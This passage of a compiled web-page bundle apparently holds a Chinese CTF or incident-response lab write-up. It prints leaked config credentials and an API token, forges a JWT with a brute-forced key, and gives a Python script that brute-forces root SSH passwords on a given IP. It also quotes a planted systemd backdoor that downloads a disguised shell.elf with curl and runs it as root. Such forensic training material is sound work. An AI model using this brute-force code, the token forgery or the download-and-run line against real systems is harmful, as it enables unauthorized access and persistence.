\u662f\u5426\u5141\u8bb8\u751f\u6210\u4ee3\u7801\uff0c\u751f\u4ea7\u73af\u5883\u8bbe\u7f6e\u4e3a false\\r\\ngenerator:\\r\\n  enabled: false\\r\\n\\r\\n# \u662f\u5426\u5f00\u542f swagger-ui\\r\\nswagger:\\r\\n  enabled: true\\r\\n\\r\\n# \u6587\u4ef6\u5b58\u50a8\u8def\u5f84 \\ r\\nfile:\\r\\n  mac:\\r\\n    path: ~/file/\\r\\n    avatar: ~/avatar/\\r\\n  linux:\\r\\n    path: /home/admin/file/\\r\\n    avatar: /home/admin/avatar/\\r\\n  windows:\\r\\n    path: C:\\\\admin\\\\file\\\\\\r\\n    avatar: C:\\\\admin\\\\avatar\\\\\\r\\n  # \u6587\u4ef6\u5927\u5c0f /M\\r\\n  maxSize: 100\\r\\n  avatarMaxSize: 5\\r\\n\\r\\n# \u4e03\u725b\u4e91 \\ r\\nqiniu:\\r\\n  # \u6587\u4ef6\u5927\u5c0f /M\\r\\n  max-size: 15\\r\\n\\r\\n# \u90ae\u7bb1\u9a8c\u8bc1\u7801\u6709\u6548\u65f6\u95f4 / \u5206\u949f \\ r\\ncode:\\r\\n  expiration: 5\\r\\n\\r\\n# \u767b\u5f55\u56fe\u5f62\u9a8c\u8bc1\u7801\u6709\u6548\u65f6\u95f4 / \u5206\u949f \\ r\\nloginCode:\\r\\n  expiration: 2\\r\\n\\r\\n# sm.ms \u56fe\u5e8a\u7684 token\\r\\nsmms:\\r\\n  token: 1oOP3ykFDI0K6ifmtvU7c8Y1eTWZSlyl\\r\\n\\r\\ntask:\\r\\n  pool:\\r\\n    # \u6838\u5fc3\u7ebf\u7a0b\u6c60\u5927\u5c0f \\ r\\n    core-pool-size: 10\\r\\n    # \u6700\u5927\u7ebf\u7a0b\u6570 \\ r\\n    max-pool-size: 30\\r\\n    # \u6d3b\u8dc3\u65f6\u95f4 \\ r\\n    keep-alive-seconds: 60\\r\\n    # \u961f\u5217\u5bb9\u91cf \\ r\\n    queue-capacity: 50",\n      "md5": null,\n      "encryptedDataKey": "",\n      "tenant": "",\n      "appName": "",\n      "type": null\n    }\n  ]\n}\n'})}),"\n",(0,t.jsx)(e.p,{children:"\u5728\u5176\u4e2d\u7684\u6ce8\u91ca\uff0c\u5c31\u6709 flag"}),"\n",(0,t.jsx)(e.p,{children:"\u540c\u65f6\uff0c\u5728\u914d\u7f6e\u6587\u4ef6\u4e2d\uff0c\u6709 8082 \u7aef\u53e3\u4e0a FMS \u7cfb\u7edf\u7684\u51ed\u636e"}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-plaintext",children:"file-manager:\n  name: admin\n  password: xj2023@1578921@123\n  jwtkey: 123456\n"})}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-flag",children:"flag{9d7ffcef-bcd1-4f4b-9a2d-d51862484168}\n"})}),"\n",(0,t.jsx)(e.h2,{id:"3",children:"3"}),"\n",(0,t.jsxs)(e.blockquote,{children:["\n",(0,t.jsx)(e.p,{children:"File Management System \u7684 flag"}),"\n"]}),"\n",(0,t.jsx)(e.p,{children:"\u5229\u7528\u4e0a\u6587\u5f97\u5230\u7684\u51ed\u636e\u8fdb\u5165 FMS \u7cfb\u7edf"}),"\n",(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{alt:"img",src:s(67363).Z+"",width:"2560",height:"1551"})}),"\n",(0,t.jsx)(e.p,{children:"\u4f46\u662f\u7cfb\u7edf\u63d0\u793a\u6743\u9650\u4e0d\u8db3\uff0c\u9700\u8981\u8eab\u4efd\u4e3a sysadmin123456 \u7528\u6237"}),"\n",(0,t.jsx)(e.p,{children:"Cookie \u4e2d\u5f97\u5230\u4e00\u4efd JWT\uff0c\u5176\u4e2d\u5305\u542b\u6709\u7528\u6237\u540d\uff0c\u7206\u7834\u53ef\u4ee5\u5f97\u5230 JWT \u7684\u5bc6\u94a5\u4e3a 123456\uff0c\u4e8e\u662f\u53ef\u4ee5\u76f4\u63a5\u4fee\u6539\u91cd\u7b7e\u4e3a"}),"\n",(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{alt:"img",src:s(4233).Z+"",width:"2559",height:"1371"})}),"\n",(0,t.jsx)(e.p,{children:"JWT \u5904\u7406\u597d\u4e4b\u540e\uff0c\u66ff\u6362\u672c\u5730\u7684 cookie\uff0c\u7136\u540e\u8bbf\u95ee fms"}),"\n",(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{alt:"img",src:s(13582).Z+"",width:"2559",height:"1371"})}),"\n",(0,t.jsx)(e.p,{children:"\u5c31\u53ef\u4ee5\u5f97\u5230\u4e09\u4e2a\u6587\u4ef6\uff0c\u91cd\u70b9\u653e\u5728 Excel \u6587\u4ef6"}),"\n",(0,t.jsx)(e.p,{children:"\u540c\u65f6\uff0c\u5c1d\u8bd5\u4e0a\u4f20\u6587\u4ef6\u7684\u65f6\u5019\uff0c\u8fd4\u56de\u7684\u4fe1\u606f\u4e2d\u5305\u542b\u6709 flag"}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-flag",children:"flag{d6c578d4a41a141d731fe7c36c8c0f77}\n"})}),"\n",(0,t.jsx)(e.h2,{id:"4",children:"4"}),"\n",(0,t.jsx)(e.p,{children:"\u4f7f\u7528\u4ee5\u4e0b\u4ee3\u7801\u8fdb\u884c\u7206\u7834"}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-python",children:'import pandas as pd\n\n# \u8bfb\u53d6 Excel \u6587\u4ef6\ndata = pd.read_excel("./ \u8fd0\u7ef4\u8d26\u53f7. xlsx")\n\ncolumn_data = data["\u5bc6\u7801"]\n\npasswords = column_data.to_list()\n\nprint(passwords)\n\nimport paramiko\n\nfor password in passwords:\n    ssh = paramiko.SSHClient()\n    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())\n    try:\n        ssh.connect("69.230.211.19", port=2222, username="root", password=password)\n    except paramiko.ssh_exception.AuthenticationException:\n        print(password, "Failed")\n        ssh.close()\n        continue\n    print(password)\n'})}),"\n",(0,t.jsxs)(e.p,{children:["\u7ecf\u8fc7 SSH \u7206\u7834\uff0c\u53ef\u4ee5\u5f97\u5230 root \u7684\u5bc6\u7801\u4e3a ",(0,t.jsx)(e.code,{children:"imArGcj9"})]}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-flag",children:"flag{imArGcj9}\n"})}),"\n",(0,t.jsx)(e.h2,{id:"5",children:"5"}),"\n",(0,t.jsxs)(e.blockquote,{children:["\n",(0,t.jsx)(e.p,{children:"\u9ed1\u5ba2\u7559\u4e0b\u7684 backdoor \u540e\u95e8\u7684\u7edd\u5bf9\u8def\u5f84"}),"\n"]}),"\n",(0,t.jsx)(e.p,{children:"\u5bf9\u7cfb\u7edf\u7684\u81ea\u542f\u52a8\uff08Enabled\uff09\u670d\u52a1\u8fdb\u884c\u6392\u67e5"}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-shell",children:"(remote) root@ip-10-0-10-1:/lib/systemd/system# systemctl list-unit-files --type=service --state=enabled\nUNIT FILE                              STATE\namazon-ssm-agent.service               enabled\napparmor.service                       enabled\nautovt@.service                        enabled\ncloud-config.service                   enabled\ncloud-final.service                    enabled\ncloud-init-local.service               enabled\ncloud-init.service                     enabled\ncontainerd.service                     enabled\ncron.service                           enabled\ndbus-org.freedesktop.timesync1.service enabled\ndocker.service                         enabled\nevilfms.service                        enabled\nfms.service                            enabled\ngetty@.service                         enabled\nnetworking.service                     enabled\nntp.service                            enabled\nresolvconf.service                     enabled\nrsyslog.service                        enabled\nssh.service                            enabled\nsshd.service                           enabled\nsyslog.service                         enabled\nsystemd-timesyncd.service              enabled\nunscd.service                          enabled\n\n23 unit files listed.\n"})}),"\n",(0,t.jsxs)(e.p,{children:["\u5728\u5176\u4e2d\u53d1\u73b0 ",(0,t.jsx)(e.code,{children:"evilfms.service"})," \u8fd9\u4e2a\u670d\u52a1"]}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-conf",metastring:'title="/etc/systemd/system/evilfms.service"',children:'[Unit]\nDescription=My evil App\nAfter=network.target\n\n[Service]\nExecStart=bash -c "curl -o /tmp/shell.elf http://localhost:8082/assets/images/fti/txt.png  && chmod +x /tmp/shell.elf & ./tmp/shell.elf&"\nWorkingDirectory=/home/\nUser=root\n\n[Install]\nWantedBy=multi-user.target\n'})}),"\n",(0,t.jsx)(e.p,{children:"\u7b54\u6848\u662f\u670d\u52a1\u914d\u7f6e\u6587\u4ef6\u7684\u8def\u5f84"}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-flag",children:"flag{/etc/systemd/system/evilfms.service}\n"})})]})}function p(n={}){const{wrapper:e}={...(0,a.a)(),...n.components};return e?(0,t.jsx)(e,{...n,children:(0,t.jsx)(d,{...n})}):d(n)}},75326:(n,e,s)=>{s.d(e,{Z:()=>t});const t=s.p+"assets/images/image_20240517-181724-b2c57594e60df3dcfc7e0d2464a08d3f.png"},67363:(n,e,s)=>{s.d(e,{Z:()=>t});const t=s.p+"assets/images/image_20240526-182644-529f92fce1ccc724ec50d7160ced4a75.png"},4233:(n,e,s)=>{s.d(e,{Z:()=>t});const t=s.p+"assets/images/image_20240527-182751-17ed441eac6907a75f0fd54f6b643c3b.png"},13582:(n,e,s)=>{s.d(e,{Z:()=>t});const t=s.p+"assets/images/image_20240528-182832-eab937635fc129a07bcd8f643e8ab4fd.png"},80937:(n,e,s)=>{s.d(e,{Z:()=>t});const t=s.p+"assets/images/image_20240547-164746-1aa594d837ede9e41b307a0692a2b947.png"},11151:(n,e,s)=>{s.d(e,{Z:()=>c,a:()=>o});var t=s(67294);const a={},r=t.createContext(a);function o(n){const e=t.useContext(r);return t.useMemo((function(){return"function"==typeof n?n(e):{...e,...n}}),[e,n])}function c(n){let e;return e=n.disableParentContext?"function"==typeof n.components?n.components(a):n.components||a:o(n.components),t.createElement(r.Provider,{value:e},n.children)}}}]);